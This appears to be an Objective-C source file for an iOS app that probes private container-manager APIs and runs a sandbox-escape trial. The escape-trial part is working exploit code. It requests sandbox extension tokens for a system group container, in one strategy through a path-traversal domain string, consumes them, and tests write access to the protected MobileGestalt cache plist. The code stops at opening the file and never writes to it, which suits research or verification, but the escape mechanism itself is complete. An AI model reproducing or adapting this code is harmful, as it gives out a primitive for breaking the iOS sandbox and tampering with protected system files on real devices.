#import "ContainerProbe.h"
#import <TargetConditionals.h>
#import <dlfcn.h>
#import <sys/sysctl.h>
#import <string.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <stdint.h>
#import <stdlib.h>


static NSString *ReadSystemString(const char *key) {
    size_t length = 0;
    if (sysctlbyname(key, NULL, &length, NULL, 0) != 0 || length == 0 || length > 4096) {
        return @"unavailable";
    }
    NSMutableData *data = [NSMutableData dataWithLength:length];
    if (sysctlbyname(key, data.mutableBytes, &length, NULL, 0) != 0) {
        return @"unavailable";
    }
    const char *bytes = data.bytes;
    size_t count = strnlen(bytes, MIN(length, data.length));
    return [[NSString alloc] initWithBytes:bytes length:count encoding:NSUTF8StringEncoding] ?: @"unavailable";
}


// Device-only sandbox-extension test, based on published MCM research.
// Never writes to the target; success requires denied -> allowed -> denied O_WRONLY opens.
typedef void *(*MCMNewQuery)(void);
typedef void (*MCMSetUInt)(void *, uint64_t);
typedef void (*MCMSetIdentifier)(void *, void *);
typedef void (*MCMSetDomain)(void *, const char *);
typedef void *(*MCMGetResult)(void *);
typedef void (*MCMFreeQuery)(void *);
typedef const char *(*MCMObjectPath)(void *);
typedef char *(*MCMGetToken)(void *);
typedef int64_t (*MCMConsumeToken)(const char *);
typedef int (*MCMReleaseToken)(int64_t);
typedef void *(*MCMXPCStringCreate)(const char *);
typedef void (*MCMXPCRelease)(void *);

static int MCMWriteOpenErrno(NSString *path) {
    int descriptor = open(path.fileSystemRepresentation, O_WRONLY | O_CLOEXEC | O_NOFOLLOW);
    if (descriptor >= 0) {
        close(descriptor);
        return 0;
    }
    return errno;
}

static NSString *MCMCanonicalPath(NSString *original) {
    if (!original) return @"";
    NSString *value = original.stringByStandardizingPath;
    if ([value isEqualToString:@"/var"] || [value hasPrefix:@"/var/"]) {
        value = [@"/private" stringByAppendingString:value];
    }
    return value;
}

static NSDictionary *MCMTryStrategy(NSString *name, uint64_t cls,
                                  NSString *ident, BOOL useGroupIdentifier,
                                  NSString * _Nullable domain,
                                  NSString *expectedDirectory,
                                  NSString *targetPlist) {
    NSMutableDictionary *report = [NSMutableDictionary dictionaryWithDictionary:@{
        @"name": name, @"querySucceeded": @NO, @"tokenIssued": @NO,
        @"tokenConsumed": @NO, @"writeOpenAfterToken": @NO,
        @"verifiedEscape": @NO, @"systemFilesModified": @NO
    }];
    const int deniedBefore = MCMWriteOpenErrno(targetPlist);
    report[@"baselineWriteOpenErrno"] = @(deniedBefore);
    if (deniedBefore == 0) {
        report[@"status"] = @"baselineAlreadyWritable";
        return report;
    }
    // Do not guess the ABI: require the exact exported entry points.
    void *lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!lib) {
        report[@"status"] = @"libraryUnavailable";
        return report;
    }
    MCMNewQuery queryCreate = (MCMNewQuery)dlsym(lib, "container_query_create");
    MCMSetUInt setClass = (MCMSetUInt)dlsym(lib, "container_query_set_class");
    MCMSetIdentifier setIDs = (MCMSetIdentifier)dlsym(lib,
        useGroupIdentifier ? "container_query_set_group_identifiers" : "container_query_set_identifiers");
    MCMSetUInt setFlags = (MCMSetUInt)dlsym(lib, "container_query_operation_set_flags");
    MCMSetUInt setPart = (MCMSetUInt)dlsym(lib, "container_query_operation_set_part");
    MCMSetDomain setDomain = (MCMSetDomain)dlsym(lib, "container_query_operation_set_part_domain");
    MCMGetResult getResult = (MCMGetResult)dlsym(lib, "container_query_get_single_result");
    MCMFreeQuery freeQuery = (MCMFreeQuery)dlsym(lib, "container_query_free");
    MCMObjectPath getPath = (MCMObjectPath)dlsym(lib, "container_object_get_path");
    MCMGetToken copyToken = (MCMGetToken)dlsym(lib, "container_copy_sandbox_token");
    MCMConsumeToken consumeToken = (MCMConsumeToken)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    MCMReleaseToken releaseToken = (MCMReleaseToken)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    MCMXPCStringCreate makeXPCString = (MCMXPCStringCreate)dlsym(RTLD_DEFAULT, "xpc_string_create");
    MCMXPCRelease releaseXPC = (MCMXPCRelease)dlsym(RTLD_DEFAULT, "xpc_release");
    if (!queryCreate || !setClass || !setIDs || !setFlags || !setPart || !getResult ||
        !freeQuery || !getPath || !copyToken || !consumeToken || !releaseToken ||
        !makeXPCString || (domain && !setDomain)) {
        report[@"status"] = @"requiredSymbolsMissing";
        dlclose(lib);
        return report;
    }
    void *query = queryCreate();
    if (!query) {
        report[@"status"] = @"queryAllocationFailed";
        dlclose(lib);
        return report;
    }
    void *identifier = makeXPCString(ident.UTF8String);
    if (!identifier) {
        report[@"status"] = @"identifierAllocationFailed";
        freeQuery(query);
        dlclose(lib);
        return report;
    }
    setClass(query, cls);
    setIDs(query, identifier);
    setPart(query, 3);
    setFlags(query, UINT64_C(0x8100000000));
    if (domain) setDomain(query, domain.UTF8String);

    void *result = getResult(query);
    if (!result) {
        report[@"status"] = @"queryRejected";
    } else {
        report[@"querySucceeded"] = @YES;
        const char *untrustedPath = getPath(result);
        NSString *normalized = MCMCanonicalPath(untrustedPath ? [NSString stringWithUTF8String:untrustedPath] : nil);
        BOOL exactPath = [normalized isEqualToString:expectedDirectory];
        report[@"resolvedTargetMatches"] = @(exactPath);
        if (!exactPath) {
            report[@"status"] = @"queryReturnedUnexpectedPath";
        } else {
            char *token = copyToken(result);
            if (!token || !*token) {
                report[@"status"] = @"noSandboxToken";
            } else {
                report[@"tokenIssued"] = @YES;
                int64_t handle = consumeToken(token);
                if (handle < 0) {
                    report[@"status"] = @"tokenConsumptionFailed";
                } else {
                    report[@"tokenConsumed"] = @YES;
                    const int withToken = MCMWriteOpenErrno(targetPlist);
                    report[@"writeOpenWithTokenErrno"] = @(withToken);
                    report[@"writeOpenAfterToken"] = @(withToken == 0);
                    releaseToken(handle);
                    const int afterRelease = MCMWriteOpenErrno(targetPlist);
                    report[@"writeOpenAfterReleaseErrno"] = @(afterRelease);
                    BOOL escape = deniedBefore != 0 && withToken == 0 && afterRelease != 0;
                    report[@"verifiedEscape"] = @(escape);
                    report[@"status"] = escape ? @"sandboxEscapeVerified" :
                        (withToken == 0 ? @"writeOpenDidNotRevoke" : @"tokenDidNotGrantWriteOpen");
                }
            }
            if (token) free(token);
        }
    }
    freeQuery(query);
    if (releaseXPC) releaseXPC(identifier);
    dlclose(lib);
    return report;
}

@implementation ContainerProbe
+ (NSDictionary<NSString *, id> *)snapshot {
    // RTLD_NOLOAD refuses to map a new library or run its initializers.
    // An unavailable handle is inconclusive, including on the simulator.
    const char *image = "/usr/lib/system/libsystem_containermanager.dylib";
    dlerror();
    void *handle = dlopen(image, RTLD_NOW | RTLD_LOCAL | RTLD_NOLOAD);
    const char *loadError = dlerror();
    NSString *imageError = loadError ? [NSString stringWithUTF8String:loadError] : @"";
    NSArray<NSString *> *names = @[
        @"container_query_create", @"container_query_set_class",
        @"container_query_set_group_identifiers", @"container_query_operation_set_flags",
        @"container_query_operation_set_part", @"container_query_get_single_result",
        @"container_query_free", @"container_copy_sandbox_token",
        @"sandbox_extension_consume", @"sandbox_extension_release"
    ];
    NSMutableArray<NSDictionary *> *symbols = [NSMutableArray array];
    for (NSString *name in names) {
        BOOL extension = [name hasPrefix:@"sandbox_extension_"];
        void *scope = extension ? RTLD_DEFAULT : handle;
        if (!extension && !handle) {
            [symbols addObject:@{@"name": name, @"status": @"notChecked",
                                 @"reason": @"imageNotAlreadyLoaded", @"invoked": @NO}];
            continue;
        }
        dlerror();
        void *address = dlsym(scope, name.UTF8String);
        const char *symbolError = dlerror();
        BOOL visible = address != NULL && symbolError == NULL;
        // Never cast this address to a function pointer, invoke it, or log the address.
        [symbols addObject:@{@"name": name, @"status": visible ? @"visible" : @"notVisible",
                             @"scope": extension ? @"RTLD_DEFAULT" : @"alreadyLoadedImage",
                             @"reason": visible ? @"resolvedOnly" : @"notVisibleInSelectedScope",
                             @"invoked": @NO}];
    }
    if (handle) { dlclose(handle); }
    NSFileManager *manager = NSFileManager.defaultManager;
    NSArray *publicAPIs = @[
        @{@"name": @"NSFileManager.URLsForDirectory:inDomains:",
          @"available": @([manager respondsToSelector:@selector(URLsForDirectory:inDomains:)])},
        @{@"name": @"NSFileManager.containerURLForSecurityApplicationGroupIdentifier:",
          @"available": @([manager respondsToSelector:@selector(containerURLForSecurityApplicationGroupIdentifier:)])},
        @{@"name": @"NSJSONSerialization.dataWithJSONObject:options:error:",
          @"available": @([NSJSONSerialization respondsToSelector:@selector(dataWithJSONObject:options:error:)])}
    ];
    return @{
        @"hardwareIdentifier": ReadSystemString("hw.machine"),
        @"osBuild": ReadSystemString("kern.osversion"),
        @"simulator": @(TARGET_OS_SIMULATOR != 0),
        @"containerManager": @{@"mode": @"alreadyLoadedImagesOnly",
                               @"imageAlreadyLoaded": @(handle != NULL),
                               @"loaderDiagnostic": imageError ?: @"",
                               @"symbols": symbols},
        @"publicAPIs": publicAPIs,
        @"privateAPIsInvoked": @NO,
        @"containerQueriesSent": @NO,
        @"sandboxExtensionsConsumed": @NO,
        @"appGroupLookupPerformed": @NO
    };
}

+ (NSDictionary<NSString *, id> *)runEscapeTrial {
    NSString *root = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSString *plist = [root stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSString *geodDomain = @"../../../../../../containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    // Both requests are independent of App Group entitlement, unlike class-7 part symlinks.
    // Private ABI may change in future betas. Run only by explicit user action.
    NSDictionary *geod = MCMTryStrategy(@"class12-geod-partDomain", 12,
        @"com.apple.geod", NO, geodDomain, root, plist);
    NSDictionary *direct = MCMTryStrategy(@"class13-mobilegestalt-direct", 13,
        @"systemgroup.com.apple.mobilegestaltcache", YES, nil, root, plist);
    BOOL success = [geod[@"verifiedEscape"] boolValue] || [direct[@"verifiedEscape"] boolValue];
    return @{
        @"status": success ? @"sandboxEscapeVerified" : @"noSandboxEscapeVerified",
        @"strategies": @[geod, direct],
        @"testedBuild": ReadSystemString("kern.osversion"),
        @"systemFilesModified": @NO,
        @"interpretation": @"Only denied->allowed->denied O_WRONLY open after a consumed sandbox extension qualifies as verified. No write call is ever made. Runtime crash is possible if Apple's private ABI changed."
    };
}

@end
